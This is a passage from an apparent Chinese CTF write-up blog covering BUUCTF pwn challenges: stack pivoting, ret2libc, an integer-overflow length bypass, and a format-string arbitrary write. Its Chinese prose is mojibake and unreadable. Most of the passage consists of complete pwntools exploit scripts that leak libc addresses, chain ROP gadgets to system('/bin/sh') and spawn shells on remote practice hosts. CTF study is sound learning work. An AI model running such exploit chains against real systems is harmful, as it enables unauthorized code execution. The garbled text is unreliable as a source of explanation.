<p>åœ¨ç¬¬äºŒæ¬¡è¾“å…¥readå‡½æ•°è¿”å›å¤„ä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œè®¡ç®—å¯å¾—æ³„éœ²ebpä¸ç¼“å†²åŒºèµ·å§‹ä½ç½®ç›¸è·0x38</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081121310.png" alt="image-20230808112121242"></p>
<h3 id="ç¬¬äºŒæ­¥-æ ˆè¿ç§»"><a href="#ç¬¬äºŒæ­¥-æ ˆè¿ç§»" class="headerlink" title="ç¬¬äºŒæ­¥ æ ˆè¿ç§»"></a>ç¬¬äºŒæ­¥ æ ˆè¿ç§»</h3><p>ç²¾å¿ƒæ„é€ æ ˆä¸Šçš„å¸ƒå±€æ¥å®ç°æ ˆè¿ç§»</p>
<h2 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h2><p><del>æ­¤å¤„ç›—å›¾ï¼Œå·²æ ‡æ˜</del></p>
<p>ç”»æ ˆå›¾æœ‰åŠ©äºç†è§£æ•´ä¸ªæµç¨‹</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081132448.png" alt="image-20230808113204424"></p>
<p>æ•´ä¸ªé•¿æ¡è¡¨ç¤ºreadè¯»å…¥çš„å­—èŠ‚é•¿åº¦0x30ï¼Œold_ebpè¡¨ç¤ºæ³„éœ²çš„ebpï¼Œå‡å»0x38æŒ‡å‘çš„å°±æ˜¯å˜é‡sçš„èµ·å§‹ä½ç½®ï¼Œè¿”å›åœ°å€è¢«è¦†ç›–ä¸ºleav_retçš„åœ°å€ã€‚</p>
<p>ç¬¬ä¸€æ¬¡è‡ªå¸¦çš„leaveæŒ‡ä»¤æ‰§è¡Œåï¼Œebpçš„å€¼ä¸ºold_ebp - 0x38 ï¼ŒespæŒ‡å‘ç¯¡æ”¹çš„è¿”å›åœ°å€leave_retï¼›æ¥ç€æ‰§è¡ŒretæŒ‡ä»¤pop eipå†ä¸€æ¬¡æ‰§è¡Œleave ret</p>
<p>ç¬¬äºŒæ¬¡leaveæŒ‡ä»¤æ‰§è¡Œåï¼ŒespæŒ‡å‘ebp+4ä¹Ÿå°±æ˜¯å›¾ä¸­â€™aaaaâ€™çš„ä¸‹ä¸€ä½ï¼Œebpçš„å€¼ä»ä¸ºold_ebp - 0x38 ï¼›æ­¤æ—¶å·²ç»å®Œæˆæ ˆè¿ç§»ã€‚æ¥ä¸‹æ¥retæŒ‡ä»¤å°†ebp+4å¼¹å…¥eipæ‰§è¡Œï¼Œæ‰€ä»¥åœ¨aaaaä¹‹åçš„åœ°å€éœ€è¦æ”¾ç½®æˆ‘ä»¬çš„systemå‡½æ•°å’Œbinsh</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081146177.png" alt="image-20230808114650151"></p>
<p>binshå’Œå…¶åœ°å€éƒ½å¯ä»¥åœ¨è¿ç§»è¿‡åçš„æ ˆä¸Šå¸ƒå±€</p>
<h2 id="0x04-3"><a href="#0x04-3" class="headerlink" title="0x04"></a>0x04</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28160</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x08048400</span></span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x27</span>) + <span class="string">b&#x27;B&#x27;</span></span><br><span class="line">p.send(payload1) <span class="comment"># not sendline</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">original_ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(original_ebp))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;aaaa&#x27;</span> <span class="comment"># for location, start of hijaction</span></span><br><span class="line">payload2 += p32(system_addr)</span><br><span class="line">payload2 += <span class="string">b&#x27;dddd&#x27;</span> <span class="comment"># fake stack ebp</span></span><br><span class="line">payload2 += p32(original_ebp - <span class="number">0x28</span>) <span class="comment"># addr of binsh</span></span><br><span class="line">payload2 += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> <span class="comment"># at ebp-0x28</span></span><br><span class="line">payload2 = payload2.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 += p32(original_ebp - <span class="number">0x38</span>) <span class="comment"># hijack ebp ,-0x38 is the aaaa</span></span><br><span class="line">payload2 += p32(leave_ret) <span class="comment"># new leave ret</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/max1z/p/15299000.html">å‚è€ƒåšå®¢</a></p>
<h1 id="é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop"><a href="#é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop" class="headerlink" title="é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop"></a>é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</h1><p>ç»å…¸ret2libc3</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072259415.png" alt="image-20230807225923356"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28146</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">plt_addr  = elf.plt[<span class="string">&#x27;write&#x27;</span>]	</span><br><span class="line">got_addr  = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(got_addr)+p32(<span class="number">0xD</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])<span class="comment">#0xf7db1190</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_addr = &quot;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line">pay2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(binsh)</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><h2 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h2><p>32ä½å¼€NXæ³„éœ²libc</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081045150.png" alt="image-20230808104509112"></p>
<p>æ³¨æ„get_næ˜¯è‡ªå®šä¹‰å‡½æ•°</p>
<p>è§„å®šè¯»å…¥v2é•¿åº¦çš„å­—ç¬¦ï¼Œä½†æ˜¯ç¨‹åºè¦æ±‚v2ä¸å¤§äº32ã€‚è§‚å¯Ÿåˆ°intå‹çš„v2ä¼ å…¥unsigned intå‹çš„a2ï¼Œå¯ä»¥ä¼ å…¥-1æ•´æ•°æº¢å‡ºç»•è¿‡ã€‚</p>
<p>ROPé“¾æ³„éœ²libcï¼Œæº¢å‡ºè¦†ç›–è¿”å›åœ°å€getshell</p>
<h2 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn0&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26602</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn0&#x27;</span>) </span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">plt_addr  = elf.plt[<span class="string">&#x27;printf&#x27;</span>]	</span><br><span class="line">got_addr  = elf.got[<span class="string">&#x27;getchar&#x27;</span>]</span><br><span class="line">fmt = <span class="number">0x080486F</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(plt_addr)+p32(main_addr)+p32(fmt)+p32(got_addr)</span><br><span class="line"><span class="comment">#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt)</span></span><br><span class="line"><span class="comment">#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getchar_addr= u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment">#getchar_addr = u32(p.recv()[0:4])å˜æˆæ¥æ”¶å‰é¢å››ä¸ªå­—èŠ‚äº†</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;getchar_addr = &quot;</span>,<span class="built_in">hex</span>(getchar_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc=LibcSearcher(&#x27;getchar&#x27;,getchar_addr)</span></span><br><span class="line"><span class="string">offset=getchar_addr-libc.dump(&#x27;getchar&#x27;)</span></span><br><span class="line"><span class="string">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">system=offset+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">base_addr = getchar_addr - libc.symbols[<span class="string">&#x27;getchar&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + base_addr</span><br><span class="line">binsh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__() + base_addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"><span class="comment">#print(&quot;libc_base_addr = &quot;,hex(offset))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line">pay2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><h2 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h2><p>æ³¨æ„è¿™é¢˜ä½64ä½ã€‚32ä½å’Œ64ä½ä¼ å‚æœ‰åŒºåˆ«</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072310866.png" alt="image-20230807231036816"></p>
<p>æ€è·¯ï¼š</p>
<ol>
<li>åˆ©ç”¨putså‡½æ•°æ³„éœ²å‡ºputså‡½æ•°çœŸå®åœ°å€</li>
<li>é€šè¿‡putså‡½æ•°åœ°å€è®¡ç®—å‡ºlibcåŸºåœ°å€ï¼Œä»è€Œè®¡ç®—å‡ºsystemå’Œbinshçš„çœŸå®åœ°å€</li>
<li>æ„é€ ropé“¾æ ˆæº¢å‡ºgetshell</li>
</ol>
<p>putså‡½æ•°é€šè¿‡pop rdi ; ret ä¼ å‚</p>
<p>ç”¨ROPgadgetå¯ä»¥æ‰¾åˆ°</p>
<h2 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"> </span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">	<span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;./pwn&#x27;</span>) </span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29917</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#elf</span></span><br><span class="line">	main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">	plt_addr  = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	got_addr  = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	pop_rdi   = <span class="number">0x0400733</span></span><br><span class="line">	ret_addr  = <span class="number">0x04004c9</span></span><br><span class="line">	</span><br><span class="line">	payload   = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#libc</span></span><br><span class="line">	lib 	        = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr) </span><br><span class="line">	lib_puts_addr   = lib.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">	lib_system_addr = lib.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">	lib_bin_addr    = lib.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#base</span></span><br><span class="line">	base_addr       = puts_addr - lib_puts_addr</span><br><span class="line">	system_addr	= base_addr + lib_system_addr</span><br><span class="line">	bin_addr	= base_addr + lib_bin_addr</span><br><span class="line">	payload		= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(ret_addr) + p64(pop_rdi) + p64(bin_addr) + p64(system_addr)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">	p.interactive()</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>64ä½çš„ret2libc3</p>
<h2 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h2><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308080953982.png" alt="image-20230808095301880"></p>
<p>åˆ©ç”¨printfæ³„éœ²libcç‰ˆæœ¬å’ŒåŸºåœ°å€ï¼Œä¼ å‚çš„æ—¶å€™éœ€è¦ä¼ å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²%sç»™å¯„å­˜å™¨rdiï¼ˆç¨‹åºä¸­ç¬¬äºŒä¸ªprintfå‡½æ•°è‡ªå¸¦ï¼Œè¿”å›è‡³è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€å³å¯ï¼‰ï¼›å¹¶å°†æƒ³è¦æ³„éœ²çš„read_gotä¼ ç»™å¯„å­˜å™¨ã€‚</p>
<h2 id="0x02-7"><a href="#0x02-7" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25502</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸€å®šè¦ç”¨é¢˜ç›®ç»™çš„libcæ–‡ä»¶ï¼Œå¯èƒ½å¿…é¡»è¦ç”¨é¢˜ç›®ç»™çš„æ‰èƒ½æ‰“é€š</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400731</span></span><br><span class="line">fmt = <span class="number">0x0000000000400790</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;read_addr ======&gt;&gt; &quot;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base = read_addr -  libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>BUUCTF pwn<br>è€ƒç‚¹ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072321504.png" alt="image-20230807232152466"></p>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä»»æ„åœ°å€å†™æ¼æ´</p>
<p>å°†xå†™ä¸º4å³å¯getshellï¼Œxçš„åœ°å€ä¸º0x0804a02cï¼Œè°ƒè¯•å¯å¾—è¾“å…¥çš„å†…å®¹ä½äºæ ˆåç§»11ä¸ªå•ä½å¤„</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29551</span>)</span><br><span class="line">x_addr=<span class="number">0x804A02C</span></span><br><span class="line"></span><br><span class="line">payload=p32(x_addr)+<span class="string">b&quot;%11$n&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æˆ–æ›´é€šç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment">#-*- coding=UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh = process(&#x27;./jarvisoj_fm&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26325</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">x_addr = <span class="number">0x0804a02c</span></span><br><span class="line"><span class="comment">#å°†æ ˆåç§»13ä¸ªå•ä½å¤„çš„x_addræŒ‡é’ˆæŒ‡å‘çš„åœ°å€å†…å®¹ä¿®æ”¹ä¸º4</span></span><br><span class="line"><span class="comment">#payloadä¸­x_addrå†™å…¥çš„ä½ç½®ä¸ºæ ˆåç§»13å¤„ï¼Œè§ä¸‹å›¾</span></span><br><span class="line"><span class="comment">#25346225(å°ç«¯)æ˜¯æ ˆåç§»11ï¼Œæ‰€ä»¥2ca00408(å°ç«¯)æ˜¯æ ˆåç§»11+2=13</span></span><br><span class="line">payload = <span class="string">&#x27;%4c%13$n&#x27;</span> + p32(x_addr)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><h2 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h2><p>64ä½å¼€å¯NX</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081846151.png" alt="image-20230808184656119"></p>
<p>æ³¨æ„ç¨‹åºç›´æ¥ä½¿ç”¨sys_readå’Œsys_writeå‡½æ•°è€Œä¸æ˜¯é€šå¸¸çš„readå’Œwriteï¼Œåœ¨æ„é€ payloadæ—¶è¦æ³¨æ„åœ¨å‡½æ•°è¿”å›æ—¶æ²¡æœ‰pop rbpè¿™ä¸€æ­¥è€Œæ˜¯ç›´æ¥æ‰§è¡Œretï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¦†ç›–rbpä¸ºvulnå‡½æ•°åœ°å€ã€‚</p>
<h2 id="0x02-8"><a href="#0x02-8" class="headerlink" title="0x02"></a>0x02</h2><p>æœ¬é¢˜ä¸¤ç§åšæ³•ï¼Œä¸€ç§æ˜¯ret2csuï¼Œåˆ©ç”¨__libc_csu_initå¸ƒç½®æ ˆç©ºé—´ï¼›ä¸€ç§æ˜¯SROP</p>
<p>é¢˜ç›®ä¹Ÿç»™å‡ºäº†ç›¸åº”çš„gadgetsï¼Œè‹¥é€‰æ‹©raxä¼ å‚0xFï¼ˆç³»ç»Ÿè°ƒç”¨å·ï¼‰ï¼Œåˆ™å¯æ‰§è¡Œsigreturnç³»ç»Ÿè°ƒç”¨ï¼›è‹¥é€‰æ‹©raxä¼ å‚0x3Bï¼Œåˆ™å¯æ‰§è¡Œexcve(â€˜&#x2F;bin&#x2F;shâ€™,0,0)ç³»ç»Ÿè°ƒç”¨</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081841853.png" alt="image-20230808184158810"></p>
<p>æˆ‘ä»¬éœ€è¦åœ¨æ ˆä¸Šå¸ƒç½®ROPgadgetså’Œå„å‚æ•°ï¼Œè€Œæ ˆåœ°å€æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦æ³„éœ²æ ˆåœ°å€ã€‚</p>
<p>åŒæ—¶æˆ‘ä»¬çŸ¥é“æ ˆä¸Šçš„å„åœ°å€é—´çš„ç›¸å¯¹ä½ç½®æ˜¯ä¸å˜çš„ï¼Œæ‰€ä»¥æ³„éœ²å‡ºæ ˆåœ°å€åå¯ä»¥é€šè¿‡ä¸bufçš„åç§»è®¡ç®—å‡ºbufçš„åœ°å€</p>
<p>ç»è¿‡è°ƒè¯•å‘ç°ï¼Œå¦‚å›¾ï¼š bufçš„èµ·å§‹åœ°å€ä¸º0x7fffffffded0ï¼Œç›®æ ‡æ³„éœ²æ ˆåœ°å€ï¼ˆå³æŸä¸ªrbpçš„å€¼ï¼‰ä¸ºå›¾ä¸­æ ˆåç§»ä¸º02çš„åœ°å€0x7fffffffe018ï¼ŒäºŒè€…ç›¸å·®0x148ã€‚è¿™æ˜¯æœ¬åœ°çš„åç§»ï¼Œè‹¥è¦è·å¾—ä¸è¿œç¨‹ç¯å¢ƒç›¸åŒçš„åç§»è¦åº”ç”¨patchelfã€‚å…·ä½“å¯çœ‹è¿™ç¯‡æ–‡ç« ã€‚ç”¨ç›¸åŒçš„æ–¹æ³•è°ƒè¯•å¯å¾—è¿œç¨‹åç§»ä¸º0x118.</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081857706.png" alt="image-20230808185715664"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081857588.png" alt="image-20230808185747565"></p>
<p>åœ¨æ¥æ”¶æ³„éœ²çš„æ ˆåœ°å€ä¹‹å‰éœ€è¦å»æ‰å¤šä½™çš„buf(0x10)+rbp(vul_addr)+æ ˆä¸Šåç§»ä¸º01çš„åœ°å€ã€‚</p>
<p>expç¬¬ä¸€éƒ¨åˆ†</p>
